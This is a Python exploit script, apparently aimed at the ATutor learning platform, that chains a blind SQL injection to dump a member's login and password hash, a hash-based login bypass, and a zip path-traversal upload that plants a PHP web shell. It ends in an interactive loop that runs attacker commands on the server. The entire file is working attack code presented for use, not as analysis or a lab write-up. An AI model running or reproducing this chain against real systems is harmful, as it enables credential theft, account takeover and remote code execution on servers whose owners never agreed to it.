import zipfile
import requests
import hashlib
import sys
import string

session = requests.Session()
cookie = ""
valid_char = string.printable
sha1 = ""
username = ""
# to dump the username and password
def sqliDump(query, label, ):
    print(f"[*] Trying to dump {label} ")
    result = []
    for i in range(1, 60):
        found_char = None
        for j in valid_char:
            payload = f"a')/**/OR/**/(SELECT/**/BINARY/**/substr(({query}),{i},1)='{j}')#"
            url = f"{sys.argv[1]}/mods/_standard/social/index_public.php"
            params = {'q': payload}
            response = session.get(url , params=params, timeout=1)
            if "void" in response.text:
                result.append(j)
                print(f"{label}: {''.join(result)}") 
                found_char = j
                break
        if found_char is None:
            print(f"[*] {label} dumped successfully")
            break
    return ''.join(result)
# sqli dump to get the username and password
def sqliCheck():
    payload = "a')/**/OR/**/(SELECT/**/1)=1#"
    data = {'q': payload}
    url = f"{sys.argv[1]}/mods/_standard/social/index_public.php"
    response = session.get(url , params=data)
    print("[*] Trying to exploit...")
    global sha1
    if "void" in response.text:
        print("[*] SQL Injection is possible ")
        sqliusername = 'select/**/login/**/from/**/AT_members'
        global username
        username = sqliDump(sqliusername, "Username")
        if username:
            sqlipassword = f'select/**/password/**/from/**/AT_members/**/where/**/login="{username}"'
            sha1 = sqliDump(sqlipassword, "Password")
            login_with_hash()        
    else:
        print("[*] theres no SQL Injection")
        exit()

# to generate the hash
def gen_hash(sha1 ,token):
    hash = hashlib
    hashed_pass = hash.sha1((sha1 + token).encode())
    return hashed_pass.hexdigest()
def login_with_hash():
    token = "a"
    password = gen_hash(sha1, token)
    print(f"[*] Trying to login using Auth Bypass")
    print(f"[*] the hashed password is {password}")
    data = {
        'form_login_action':'True',
        'form_course_id':'0',
        'form_password_hidden': password,
        'p':'',
        'form_login': username,
        'form_password':'',
        'submit':'Login',
        'token':token
    }
    url = f"{sys.argv[1]}/login.php"
    response = session.post(url=url, data=data)
    global cookie
    cookie = session.cookies.get_dict()
    session.get(f"{sys.argv[1]}/users/index.php", cookies=cookie)
    cookie = session.cookies.get_dict()
    session.get(f"{sys.argv[1]}/bounce.php?course=1", cookies=cookie)
    cookie = session.cookies.get_dict()
    session.get(f"{sys.argv[1]}/index.php", cookies=cookie)
    cookie = session.cookies.get_dict()
    session.get(f"{sys.argv[1]}/mods/_standard/tests/my_tests.php", cookies=cookie)
    cookie = session.cookies.get_dict()
    session.get(f"{sys.argv[1]}/mods/_standard/tests/index.php", cookies=cookie)
    cookie = session.cookies.get_dict()
    if "My Start Page" in response.text:
        print("[*] Logged in succsessfully")
    else:
        print("[!] Filed")
    create_zip_file()
# to create the zip file to gain to rce
def create_zip_file():
    print("[*] creating the zip file")
    with zipfile.ZipFile("archive.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("imsmanifest.xml", "invalid")
        zipf.writestr("../../../../../../../../var/www/html/content/feeds/exploit.phtml", "<?php system($_GET['cmd']); ?>")
        zipf.close()
        send_request()
# send request for the zip file
def send_request():
    url = f"{sys.argv[1]}/mods/_standard/tests/import_test.php"
    with open("archive.zip", "rb") as file:
        upload_file = {"file": ('archive.zip', file, 'application/x-zip-compressed')}
        proxies = {"http": "http://192.168.1.103:8082"}
        values = {"submit_import": "Import"}
        response = session.post(url, data=values, files=upload_file, cookies=cookie, proxies=proxies)
        if response.text == "XML error: Not well-formed (invalid token) at line 1":
            print("[*] the file uploaded successfully")
            remote_code()
        else:
            print("[!] failed to upload the file")
def remote_code():
    print("[*] trying to get the rce")
    print("[*] enter the command to execute")
    while True:
        cmd = input("# ")
        response = requests.get(f"{sys.argv[1]}/content/feeds/exploit.phtml?cmd={cmd}")
        print(response.text)
sqliCheck()
